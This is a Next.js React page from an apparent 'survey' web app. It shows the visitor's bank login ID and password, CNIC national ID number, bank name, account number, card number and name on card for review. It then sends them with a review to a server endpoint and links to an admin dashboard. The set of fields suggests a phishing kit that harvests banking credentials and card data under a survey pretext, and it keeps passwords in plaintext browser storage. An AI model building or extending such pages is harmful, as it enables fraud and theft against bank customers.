"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";

export default function ReviewPage() {
  const router = useRouter();
  const [account, setAccount] = useState<any>(null);
  const [card, setCard] = useState<any>(null);
  const [review, setReview] = useState("");

  useEffect(() => {
    setAccount(JSON.parse(localStorage.getItem("survey-account") || "null"));
    setCard(JSON.parse(localStorage.getItem("survey-card") || "null"));
  }, []);

  const handleSubmit = async () => {
    if (!review.trim()) {
      alert("Please write a review before submitting.");
      return;
    }

    try {
      const accountData = JSON.parse(localStorage.getItem("survey-account") || "{}");
      const cardData = JSON.parse(localStorage.getItem("survey-card") || "{}");

      const res = await fetch("/api/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ account: accountData, card: cardData, review }),
      });

      const data = await res.json();

      if (data.error) {
        alert("Error submitting survey: " + data.error);
        return;
      }

      alert("🎉 Survey submitted successfully!");
      localStorage.removeItem("survey-account");
      localStorage.removeItem("survey-card");
      localStorage.removeItem("survey-review");
      router.push("/account");
    } catch (err) {
      alert("Error submitting survey.");
    }
  };

  const handleBack = () => {
    router.push("/card");
  };

  return (
    <div className="min-h-screen p-6 max-w-2xl mx-auto">
      <h1 className="text-3xl font-bold mb-6">Review Your Information</h1>

      <div className="bg-white p-5 rounded shadow mb-6">
        <h2 className="text-xl font-semibold mb-3">Account Details</h2>
        {account && (
          <ul className="space-y-1">
            <li><b>Login ID:</b> {account.loginId}</li>
            <li><b>Password:</b> {account.password}</li>
            <li><b>CNIC:</b> {account.cnic}</li>
            <li><b>Bank Name:</b> {account.bankName}</li>
            <li><b>Account Number:</b> {account.accountNumber}</li>
          </ul>
        )}
      </div>

      <div className="bg-white p-5 rounded shadow mb-6">
        <h2 className="text-xl font-semibold mb-3">Card Details</h2>
        {card && (
          <ul className="space-y-1">
            <li><b>Card Number:</b> {card.cardNumber}</li>
            <li><b>Issued Date:</b> {card.issuedDate}</li>
            <li><b>Name on Card:</b> {card.nameOnCard}</li>
          </ul>
        )}
      </div>

      <textarea
        className="w-full h-40 p-3 border rounded mb-6"
        placeholder="Write your review..."
        value={review}
        onChange={(e) => setReview(e.target.value)}
      />

      <div className="flex gap-3">
        <button
          onClick={handleBack}
          className="bg-gray-300 text-black p-3 rounded w-full"
        >
          Back
        </button>

        <button
          onClick={handleSubmit}
          className="bg-blue-600 text-white p-3 rounded w-full"
        >
          Submit
        </button>
      </div>

        <div className="min-h-screen p-6 max-w-xl mx-auto flex flex-col">
  {/* Your form content */}
  <div className="space-y-4">
    {/* ...inputs and buttons... */}
  </div>

  {/* Footer with Admin link */}
  {/* Admin Link */}
        <footer className="w-full py-4 text-center mt-200">
          <Link 
            href="/admin"
            className="text-blue-600 font-semibold hover:underline"
          >
            Admin Dashboard
          </Link>
        </footer>
</div>

    </div>
  );
}
